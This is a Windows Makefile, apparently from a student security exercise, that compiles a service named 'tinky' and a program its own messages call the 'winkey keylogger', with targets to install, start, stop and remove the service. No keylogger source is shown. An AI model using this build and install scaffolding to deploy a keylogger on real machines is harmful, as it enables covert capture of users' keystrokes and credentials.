all: svc winkey

svc: svc.cpp
	@echo Compiling the svc service...
	cl /EHsc /Wall /WX /wd4996 /wd5039 /wd4668 /wd4820 /wd5045 /Fe:svc.exe svc.cpp  userenv.lib wtsapi32.lib shlwapi.lib shell32.lib advapi32.lib ole32.lib
	@echo svc service compiled successfully.

winkey: winkey.c
	@echo Compiling the winkey keylogger...
	cl /EHsc /Wall /WX /wd4668 /wd4255 /wd5045 /wd4820 winkey.c /link \
	    /out:winkey.exe /SUBSYSTEM:WINDOWS user32.lib psapi.lib wtsapi32.lib advapi32.lib
	@echo winkey keylogger compiled successfully.

clean:
	@echo Cleaning up generated files...
	del svc.exe winkey.exe
	@echo Files cleaned.

install: svc
	@echo Installing the tinky service...
	svc.exe install
	@echo tinky service installed.

start:
	@echo Starting the tinky service...
	svc.exe start
	@echo tinky service started.

stop:
	@echo Stopping the tinky service...
	svc.exe stop
	@echo tinky service stopped.

delete:
	@echo Removing the tinky service...
	svc.exe delete
	@echo tinky service deleted.
